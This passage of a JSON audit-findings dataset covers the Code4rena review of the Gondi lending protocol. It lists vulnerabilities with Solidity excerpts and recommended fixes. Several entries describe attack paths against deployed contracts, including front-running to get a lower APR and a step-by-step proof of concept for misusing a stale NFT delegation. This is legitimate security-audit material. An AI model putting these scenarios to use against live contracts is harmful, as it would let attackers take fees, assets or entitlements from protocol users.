      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35270",
      "title": "[L-03] Unnecessary math operation when `_remainingNewLender` is set to type(uint256).max in the refinance flow",
      "impact": "LOW",
      "content": "\nWhen a lender initiates `refinanceFull()` or `refinancePartial()`, `_remainingNewLender` will be set to `type(uint256).max` (`src/lib/loans/MultiSourceLoan.sol# L280`), which indicates the lender will repay existing lenders.\n\nHowever, even when `_remainingNewLender` is set to `type(uint256).max`, in `_processOldTranche()`, `_remainingNewLender -= oldLenderDebt` will still run. This is not meaningful.\n```\n\n//src/lib/loans/MultiSourceLoan.sol\n    function _processOldTranche(\n        address _lender,\n        address _borrower,\n        address _principalAddress,\n        Tranche memory _tranche,\n        uint256 _endTime,\n        uint256 _protocolFeeFraction,\n        uint256 _remainingNewLender\n    ) private returns (uint256 accruedInterest, uint256 thisProtocolFee, uint256 remainingNewLender) {\n...\n        if (oldLenderDebt > 0) {\n            if (_lender != _tranche.lender) {\n                asset.safeTransferFrom(_lender, _tranche.lender, oldLenderDebt);\n            }\n            unchecked {\n|>              _remainingNewLender -= oldLenderDebt;\n            }\n        }\n|>       remainingNewLender = _remainingNewLender;\n```\n\n`src/lib/loans/MultiSourceLoan.sol# L665`\n\n### Recommendations\n\nIn `_processOldTranche()`, add a check and only perform the subtraction when `_remainingNewLender != type(uint256).max`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35269",
      "title": "[L-02] `_checkStrictlyBetter` might underflow revert without triggering the custom error",
      "impact": "LOW",
      "content": "\nIn `MutliSourceLoan::refinanceFull()`, if lender initiated the refinance, `_checkStrictlyBetter()` will run to ensure if the lender provided more principal; the annual interest with the new principal is still better than existing loan. If it’s not strictly better, the tx should throw with a custom error `NotStrictlyImprovedError()`. However, the custom error might not be triggered due to an earlier underflow error.\n\nIf `_offerPrincipalAmount < _loanPrincipalAmount`, or if `_loanAprBps * _loanPrincipalAmount < _offerAprBps * _offerPrincipalAmount`, the tx will throw without triggering the custom error.\n```\n\n//src/lib/loans/MultiSourceLoan.sol\n    function _checkStrictlyBetter(\n        uint256 _offerPrincipalAmount,\n        uint256 _loanPrincipalAmount,\n        uint256 _offerEndTime,\n        uint256 _loanEndTime,\n        uint256 _offerAprBps,\n        uint256 _loanAprBps,\n        uint256 _offerFee\n    ) internal view {\n...\n        if (\n|>           ((_offerPrincipalAmount - _loanPrincipalAmount != 0) &&\n|>                ((_loanAprBps *\n                    _loanPrincipalAmount -\n                    _offerAprBps *\n                    _offerPrincipalAmount).mulDivDown(\n                        _PRECISION,\n                        _loanAprBps * _loanPrincipalAmount\n                    ) < minImprovementApr)) ||\n            (_offerFee != 0) ||\n            (_offerEndTime < _loanEndTime)\n        ) {\n            revert NotStrictlyImprovedError();\n        }\n...\n```\n\n`src/lib/loans/MultiSourceLoan.sol# L1112-L1116`\n\n### Recommendations\n\nCheck for underflow and revert with custom error early.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35268",
      "title": "[L-01] `Delegated` and `RevokeDelegate` event should have `bytes32 _rights`",
      "impact": "LOW",
      "content": "\n**Instances (2)**\n\nWhen a borrower `delegate` or `revokeDelegate`, custom delegation rights `bytes32 _rights` will not be included in event `Delegated` and event `RevokeDelegate`.\n\nIn `DelegateRegistry`, custom rights `bytes32 _rights` are hashed into delegation key when storing delegation data. `bytes32 _rights` is crucial in tracking delegations off-chain.\n```\n\n//src/lib/loans/MultiSourceLoan.sol\n    function delegate(\n        uint256 _loanId,\n        Loan calldata loan,\n        address _delegate,\n        bytes32 _rights,\n        bool _value\n    ) external {\n...\n        IDelegateRegistry(getDelegateRegistry).delegateERC721(\n            _delegate,\n            loan.nftCollateralAddress,\n            loan.nftCollateralTokenId,\n            _rights,\n            _value\n        );\n|>      emit Delegated(_loanId, _delegate, _value);\n```\n\n`src/lib/loans/MultiSourceLoan.sol# L487`\n```\n\n//src/lib/loans/MultiSourceLoan.sol\n    function revokeDelegate(address _delegate, address _collection, uint256 _tokenId) external {\n...\n|>        emit RevokeDelegate(_delegate, _collection, _tokenId);\n```\n\n`src/lib/loans/MultiSourceLoan.sol# L498`\n\n### Recommendations\n\nConsider adding `bytes32 _rights` field in `Delegated` and `RevokeDelegate` event.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35285",
      "title": "[L-18] In edge cases, LidoEthBaseInterestAllocator's `aprBps` might be updated to 0",
      "impact": "LOW",
      "content": "In LidoEthBaseInterestAllocator.sol, `getBaseAprWithUpdate()` checks at least minimal time (`getLidoUpdateTolerance`) has passed before revising `aprBps`.\n\nHowever, there is no guarantee rebasing will occur before `getLidoUpdateTolerance`. If rebasing didn’t occur before `getLidoUpdateTolerance`, `shareRate` might not change. In `_updateLidoValues()`, `_lidoData.aprBos` will be set to 0, which is an invalid value.\n\n```solidity\n    function getBaseAprWithUpdate() external returns (uint256) {\n        LidoData memory lidoData = getLidoData;\n|>      if (block.timestamp - lidoData.lastTs > getLidoUpdateTolerance) {\n            _updateLidoValues(lidoData);\n        }\n...\n\n    function _updateLidoValues(LidoData memory _lidoData) private {\n        uint256 shareRate = _currentShareRate();\n|>      _lidoData.aprBps = uint16(\n            _BPS * _SECONDS_PER_YEAR * (shareRate - _lidoData.shareRate) / _lidoData.shareRate\n                / (block.timestamp - _lidoData.lastTs)\n        );\n...\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/LidoEthBaseInterestAllocator.sol#L163\n\n### Recommendation\n\nIn `_updateLidoValues()`, consider adding a check to ensure `shareRate > _lidoData.shareRate` before calculating the new `aprBps`.\n\n***",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35284",
      "title": "[L-17] Unused constant declaration",
      "impact": "LOW",
      "content": "`_PRINCIPAL_PRECISION` is not used in LidoEthBaseInterestAllocator.sol.\n\n```solidity\n//src/lib/pools/LidoEthBaseInterestAllocator.sol\n\n    uint256 private constant _PRINCIPAL_PRECISION = 1e20;\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/LidoEthBaseInterestAllocator.sol#L29\n\n### Recommendation\n\nRemove `_PRINCIPAL_PRECISION`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35283",
      "title": "[L-16] Unused library import",
      "impact": "LOW",
      "content": "FixedPointMathLib is imported in ERC4626.sol but no longer used.\n\n```solidity\n//src/lib/pools/ERC4626.sol\n|> import {FixedPointMathLib} from \"@solmate/utils/FixedPointMathLib.sol\";\n\n/// @notice Fork from Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC4626.sol)\n///        to allow extra decimals.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC4626.sol)\nabstract contract ERC4626 is ERC20 {\n    using Math for uint256;\n    using SafeTransferLib for ERC20;\n    using FixedPointMathLib for uint256; //@audit Low: Unused library import. Remove unused library.\n...\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/ERC4626.sol#L7\n\n### Recommendation\n\nRemove unused library.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35282",
      "title": "[L-15] Current `afterCallerAdded()` hook will approve caller `type(uint256).max` regardless of whether the caller is a liquidator or a loan contract.",
      "impact": "LOW",
      "content": "In src/lib/pools/Pool.sol, accepted callers can be either a loan contract or a liquidator. Currently `afterCallerAdded()` will approve `type(uint256).max` assets to both a loan or liquidator contract. This is unnecessary since a liquidator contract doesn't pull assets from the pool.\n\n```solidity\n//src/lib/pools/Pool.sol\n    function addCallers(ProposedCaller[] calldata _callers) external {\n        if (msg.sender != getParameterSetter) {\n            revert InvalidCallerError();\n        }\n        uint256 totalCallers = _callers.length;\n        for (uint256 i = 0; i < totalCallers;) {\n            ProposedCaller calldata caller = _callers[i];\n            _acceptedCallers.add(caller.caller);\n            _isLoanContract[caller.caller] = caller.isLoanContract;\n\n|>          afterCallerAdded(caller.caller);\n            unchecked {\n                ++i;\n            }\n        }\n\n        emit CallersAdded(_callers);\n    }\n\n    function afterCallerAdded(address _caller) internal override {\n        asset.approve(_caller, type(uint256).max);\n    }\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/LoanManager.sol#L66\n\n### Recommendation\n\nConsider only approve `type(uint256).max` for loan contracts.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35281",
      "title": "[L-14] `OraclePoolOfferHandler::validateOffer` allows borrowers to game spot `aprPremium` movement to get lower apr",
      "impact": "LOW",
      "content": "In OraclePoolOfferHandler.sol, `aprPremium` is partially based on current pool utilization (`totalOutstanding`/`totalAssets`). \n\nIn `OraclePoolOfferHandler::validateOffer`, `aprPremium` will not re-calculate unless min time interval (`getAprUpdateTolerance`) has passed. At the same time, anyone can call `setAprPremium()` to update `aprPremium` instantly.\n\n```solidity\n    function setAprPremium() external {\n|>      uint128 aprPremium = _calculateAprPremium();\n        getAprPremium = AprPremium(aprPremium, uint128(block.timestamp));\n\n        emit AprPremiumSet(aprPremium);\n    }\n\n    function validateOffer(uint256 _baseRate, bytes calldata _offer)\n        external\n        view\n        override\n        returns (uint256, uint256)\n    {\n        AprPremium memory aprPremium = getAprPremium;\n        uint256 aprPremiumValue =\n|>          (block.timestamp - aprPremium.updatedTs > getAprUpdateTolerance) ? _calculateAprPremium() : aprPremium.value;\n...\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/OraclePoolOfferHandler.sol#L193\n\nThis allows the attack vector of a borrower game spot `aprPremium` change due to pool activities to get lower apr.\n1. A borrower can back-run a large principal repay with `setAprPremium()` call before taking out a loan (`emitLoan()`). This allows the borrower get a lower apr taking advantage of a sudden drop in utilization ratio.\n2. A borrower can also front-run a large principal borrow with `setAprPremium()` call and back-run the borrow with `emitLoan()`. This ensures the spiked utilization in the pool will not increase `aprPremium` at the time `emitLoan()` tx settles.\n\n### Recommendation\n\nConsider updating `aprPremium` atomically in `validateOffer`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35280",
      "title": "[L-13] `vaultID`’s NFT/ERC20 bundle can be modified while the loan is outstanding",
      "impact": "LOW",
      "content": "UserVault.sol allows a user to bundle assets (NFT/ERC20) together in a vault to be used as a collateral NFT. \n\nAccording to [doc](https://app.gitbook.com/o/4HJV0LcOOnJ7AVJ77p8e/s/W2WSJrV6PSLWo4p8vIGq/vaults), the intended behavior is `new NFTs cannot be added to the vault unless borrower burn the vault and create a new vaultId with a new bundle of asset`.\n\nThis is not currently the case in UserVault.sol. Anyone can deposit ERC20 or ERC721 to an existing `vaultID` at any time. Although this doesn’t decrease assets from the vault, this may increase VaultID assets at any time during lender offer signing, loan outstanding, and loan liquidation auction process.\n\n```solidity\n    function depositERC721(uint256 _vaultId, address _collection, uint256 _tokenId) external {\n        _vaultExists(_vaultId);\n\n        if (!_collectionManager.isWhitelisted(_collection)) {\n            revert CollectionNotWhitelistedError();\n        }\n        _depositERC721(msg.sender, _vaultId, _collection, _tokenId);\n    }\n\n    function _depositERC721(address _depositor, uint256 _vaultId, address _collection, uint256 _tokenId) private {\n        ERC721(_collection).transferFrom(_depositor, address(this), _tokenId);\n\n        _vaultERC721s[_collection][_tokenId] = _vaultId;\n\n        emit ERC721Deposited(_vaultId, _collection, _tokenId);\n    }\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/UserVault.sol#L152-L158\n\nIncreasing the assets of a `vaultId` doesn’t put a loan’s collateralization at risk. However, this may create inconsistencies in lender offers due to `vaultId`‘s changing asset bundle. \n\nDue to the permissionless deposit process of UserVault.sol, this may also allow a malicious actor to deposit assets to a `vaultID` during auciton to manipulate bidding.\n\n### Recommendation\n\nIf the intention is to disallow adding new NFTs to a vault before burning of `vaultId`, consider a two-step deposit and vault mint process: caller deposit assets to a new `vaultId` first before minting the `vaultId` and disallow deposit to a `vaultId` after minting.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35279",
      "title": "[L-12] Incorrect comments",
      "impact": "LOW",
      "content": "**Instances (2)**\n\n1. Auction Loan liquidator -> User Vault\n\n```solidity\n/// @title Auction Loan Liquidator\n/// @author Florida St\n/// @notice NFTs that represent bundles.\ncontract UserVault is ERC721, ERC721TokenReceiver, IUserVault, Owned {\n...\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/UserVault.sol#L13\n\n2. `address(0)` = ETH -> address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE) = ETH\n\n```solidity\n    /// @notice ERC20 balances for a given vault: token => (vaultId => amount). address(0) = ETH\n    mapping(address token => mapping(uint256 vaultId => uint256 amount)) _vaultERC20s;\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/UserVault.sol#L33\n\n### Recommendation\n\nCorrect comments.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35278",
      "title": "[L-11] Some proposed callers might not be confirmed",
      "impact": "LOW",
      "content": "LoanManagerParameterSetter.sol has a two-step process of adding callers. The issue is `addCallers()` doesn't check whether `_callers.length == proposedCallers.length`. If `_callers.length < proposedCaller.length`, some `proposedCallers`' indexes will not run in the for-loop. `proposedCallers` whose indexes are after callers will not be added as callers.\n\n```solidity\n//src/lib/loans/LoanManagerParameterSetter.sol\n    function addCallers(ILoanManager.ProposedCaller[] calldata _callers) external onlyOwner {\n        if (getProposedAcceptedCallersSetTime + UPDATE_WAITING_TIME > block.timestamp) {\n            revert TooSoonError();\n        }\n        ILoanManager.ProposedCaller[] memory proposedCallers = getProposedAcceptedCallers;\n        uint256 totalCallers = _callers.length;\n|>      for (uint256 i = 0; i < totalCallers;) {\n            ILoanManager.ProposedCaller calldata caller = _callers[i];\n            if (\n                proposedCallers[i].caller != caller.caller || proposedCallers[i].isLoanContract != caller.isLoanContract\n            ) {\n                revert InvalidInputError();\n            }\n\n            unchecked {\n                ++i;\n            }\n        }\n        ILoanManager(getLoanManager).addCallers(_callers);\n    }\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/LoanManagerParameterSetter.sol#L110\n\n### Recommendation\n\nAdd check to ensure `_callers.length == proposedCallers.length`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35277",
      "title": "[L-10] Unnecessary code - BytesLib methods are not used in this contract or its parent contracts",
      "impact": "LOW",
      "content": "BytesLib methods are not used in PurchaseBundler.sol or its parent contracts.\n\n```solidity\n//src/lib/callbacks/PurchaseBundler.sol\n    using BytesLib for bytes;\n...\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/callbacks/PurchaseBundler.sol#L24\n\n### Recommendation\n\nConsider removing this line.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35276",
      "title": "[L-09] `updateLiquidationContract()` might lock collaterals and funds in the current liquidator contract",
      "impact": "LOW",
      "content": "In `LiquidationHandler::updateLiquidationContract()`, the loan liquidator contract can be updated. \n\n```solidity\n    function updateLiquidationContract(address __loanLiquidator) external override onlyOwner {\n        __loanLiquidator.checkNotZero();\n        _loanLiquidator = __loanLiquidator;\n        emit LiquidationContractUpdated(__loanLiquidator);\n    }\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/LiquidationHandler.sol#L74\n\nThere are two vulnerable conditions: `updateLiquidationContract()` is called when there are ongoing/unsettled auctions in the current liquidator or there might be a pending `liquidateLoan()` tx.\n\n1. If MultisourceLoan's liquidator contract is updated. None of the exiting auctions originated from the MultisourceLoan can be settled because `AuctionLoanLiquidator::settleAuction` will call [`IMultiSourceLoan(_auction.loanAddress).loanLiquidated(...`](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/AuctionLoanLiquidator.sol#L300). This will cause the [`onlyLiquidator` modifier to revert](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L464). MultiSourceLoan contract no longer recognizes the old liquidator contract. The collateral and bid funds will be locked in the old liquidator contract.\n\n2. If there is a pending [`MultiSourceLoan::liquidateLoan`](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L445) tx before `updateLiquidationContract()` call. The auction of the loan will be created right before `updateLiquidationContract()` settles. Similar to number 1, the collateral will be locked in the old liquidator contract. In addition, since `MultiSourceLoan::liquidateLoan()` is permissionless, an attacker can front-run `updateLiquidationContract` tx to cause the loan liquidated to an old liquidator contract.\n\n### Recommendation\n\n1. In `UpdateLiquidationContract()`, consider adding a check that the existing liquidator’s token balance is 0, with no outstanding auction.\n2. Only update `liquidationContract` when there are no liquidatable loans.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35275",
      "title": "[L-08] Consider adding a cap for `minLockPeriod`",
      "impact": "LOW",
      "content": "`_minLockPeriod` is used to compute the lock time for a tranche or a loan. If the ratio is set too high (e.g., 10000), tranches or loans cannot be refinanced due to [failing `_loanLocked()` checks](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L181).\n\n```solidity\n//src/lib/loans/MultiSourceLoan.sol\n    function setMinLockPeriod(uint256 __minLockPeriod) external onlyOwner {\n\n        _minLockPeriod = __minLockPeriod;\n\n        emit MinLockPeriodUpdated(__minLockPeriod);\n    }\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L508\n\n### Recommendation\n\nConsidering adding a cap value (e.g., 10%).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35274",
      "title": "[L-07] Borrowers might use a lender's `addNewTranche` renegotiation offer to `refinanceFull` in some cases",
      "impact": "LOW",
      "content": "A borrower can use a lender’s renegotiation offer signature for `addNewTranch()` in `refinanceFull()`, as long as the loan only has one tranche.\n\nThis is because `refinanceFull()` only checks [whether `_renegotiationOffer.trancheIndex.length == _loan.tranche.length`](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L168). When there's only one tranche in the loan, [`addNewTranche()`'s `renegoationOffer`'s check condition](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L379) will also satisfy.\n\n`refinanceFull()` will also ensure the refinanced tranche [gets a better apr](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L591). So the borrower gets better apr for the existing tranche instead of taking out additional principal in `addNewTranche()`.\n\nIn addition, if the lender signed a renegotiation offer intended for `refinanceFull()`, the same offer can also be used for `addNewTranche()` if the condition `_renegotiationOffer.trancheIndex[0] == _loan.tranche.length` is satisfied. Because `_renegotiationOffer.trancheIndex[0]` is never checked in `refinanceFull()` flow, the lender might supply any values. In this case, the lender is forced to open a more junior tranche which can be risky for lenders.\n\nIt's better to prevent the same renegotiation offer from being used interchangeably in different methods with different behaviors.\n\n### Recommendation\n\nIn `refinanceFull()`, add a check to ensure `_renegotiationOffer.trancheIndex[0]==0`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35273",
      "title": "[L-06] Borrower can use an arbitrary `offerId` for a pool contract's loan offer, which might lead to incorrect off-chain accounting.",
      "impact": "LOW",
      "content": "`offerId` is a field in struct [`LoanOffer`](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/interfaces/loans/IMultiSourceLoan.sol#L26) and `LoanOffer` is typically signed by the lender. Currently, `offerId` is generated off-chain and its correctness is verified through [`_checkSignature(lender, offer.hash()`, `_lenderOfferSignature`)](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L780) in the emitLoan flow.\n\nBut when the lender is a pool contract, `offerId` will not be verified due to `_checkSignature()` being [bypassed in `_validateOfferExectuion()`](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L777). \n\nA borrower can supply any offerIds for a pool lender offer in `emitLoan()` or `refinanceFromLoanExeuctionData()` flow. As a result, `emit LoanEmitted(loanId, offerIds, loan, totalFee)` or `emit LoanRefinancedFromNewOffers(_loanId, newLoanId, loan, offerIds, totalFee)` will contain arbitrary `offerIds`. This may create conflicts in off-chain offerId accounting.\n\n### Recommendation\n\nIf `offerId` for a pool lender is relevant, consider allowing a pool contract to increment and store its next offerId on-chain.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35272",
      "title": "[L-05] Pool contract can miss Loan offer origination fees if the borrower submits `emitLoan()`",
      "impact": "LOW",
      "content": "A lender can specify an optional loan offer origination fee, which will be [charged at loan initiation (`emitLoan`)](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L1012). The origination fee specified in struct `LoanOffer` will be deducted from the borrow principal amount.\n\nIf the lender is a pool contract, this origination fee can be skipped by the borrower initiating `emitLoan()` with `OfferExecution.offer.fee` as 0. This fee will not be verified in [the current `pool.validateOffer` flow](https://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/pools/Pool.sol#L358-L359).\n\nNote that if the protocol submitted the `emitLoan` (e.g., the borrower placed loan request through UI), the protocol can still enforce the origination fee by supplying non-zero `OfferExecution.offer.fee`. This allows a borrower to avoid paying the origination fee for any pool contract lender.\n\n### Recommendation\n\nEither in the pool’s `validateOffer()` or `PoolOfferHandler.validateOffer()`, add a check to ensure the origination fee is satisfied.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-06-gondi",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "35267",
      "title": "[M-03] Delegations cannot be removed in some cases due to vulnerable `revokeDelegate()` implementation",
      "impact": "MEDIUM",
      "content": "An old borrower can use an old delegation to claim on behalf of a new borrower.\n\n### Proof of Concept\n\nA borrower can delegate locked collateral NFT through `delegateRegistry` to prove token ownership and claim airdrops, event ticketing, etc.\n\n[`delegateRegistry`](https://etherscan.io/address/0x00000000000000447e69651d841bD8D104Bed493#code) by Delegate.Cash protocol allows custom rights to be configured to a delegatee.\n\nCurrently, `MultiSourceLoan::delegate` allows a borrower to configure `bytes32 _rights` to `delegateERC721`. In `DelegateRegistry::delegateERC721`, `bytes32 rights` will be [hashed as part of the key](https://github.com/delegatexyz/delegate-registry/blob/ce89e65f9364db21fc621e247a829d9c08374b4e/src/DelegateRegistry.sol#L83) to store delegation data.\n\n```solidity\n//src/lib/loans/MultiSourceLoan.sol\n    function delegate(uint256 _loanId, Loan calldata loan, address _delegate, bytes32 _rights, bool _value) external {\n        if (loan.hash() != _loans[_loanId]) {\n            revert InvalidLoanError(_loanId);\n        }\n        if (msg.sender != loan.borrower) {\n            revert InvalidCallerError();\n        }\n        //@audit-info a borrower can pass custom rights to delegateERC721\n|>      IDelegateRegistry(getDelegateRegistry).delegateERC721(\n            _delegate, loan.nftCollateralAddress, loan.nftCollateralTokenId, _rights, _value\n        );\n\n        emit Delegated(_loanId, _delegate, _value);\n    }\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L484\n\nThe problem is, in `MultiSourceLoan::revokeDelegate`, empty rights will always be passed to `delegateERC721`. This means when a borrower configures custom rights in `delegate()`, they cannot remove the delegation. In `DelegateRegistry::delegateERC721`, empty rights will be hashed into a different key from the borrower's actual delegation. [Incorrect delegation data will be read](https://github.com/delegatexyz/delegate-registry/blob/ce89e65f9364db21fc621e247a829d9c08374b4e/src/DelegateRegistry.sol#L83-L85) and `delegateERC721` call will return with no change.\n\n```solidity\n//src/lib/loans/MultiSourceLoan.sol\n    function revokeDelegate(address _delegate, address _collection, uint256 _tokenId) external {\n        if (ERC721(_collection).ownerOf(_tokenId) == address(this)) {\n            revert InvalidMethodError();\n        }\n        //@audit revokeDelegate will always pass empty rights.\n|>      IDelegateRegistry(getDelegateRegistry).delegateERC721(_delegate, _collection, _tokenId, \"\", false);\n\n        emit RevokeDelegate(_delegate, _collection, _tokenId);\n    }\n```\n\nhttps://github.com/code-423n4/2024-06-gondi/blob/ab1411814ca9323c5d427739f5771d3907dbea31/src/lib/loans/MultiSourceLoan.sol#L496\n\n**POC:**\n\n1. The original borrower set custom rights and delegated their collateral NFT to a custom contract.\n2. The original borrower's loan ended and NFT is transferred to a new borrower.\n3. The protocol or the new borrower calls `revokeDelegate()` to remove previous delegations of the NFT.\n4. The new borrower takes out a loan with the NFT and calls `delegate()`, delegating the NFT to a hot wallet.\n5. The original borrower's old delegation is not cleared from `delegateRegistry` and still claims an event ticket using the old delegation. The old borrower claims the new borrower's ticket.\n\n### Recommended Mitigation Steps\n\nIn `revokeDelegate()`, allow passing `bytes32 _rights` into `delegateERC721()` to correctly revoke existing delegations with custom rights.\n\n### Assessed type\n\nError\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-06-gondi-findings/issues/2#event-13414538986)**\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-06-gondi-findings/issues/2#issuecomment-2220217025):**\n > The Warden has outlined how the protocol will incorrectly integrate with the `DelegateRegistry` system, attempting to revoke a previous delegation via an empty payload which is a futile attempt as proper revocation would require the same `_rights` to be passed 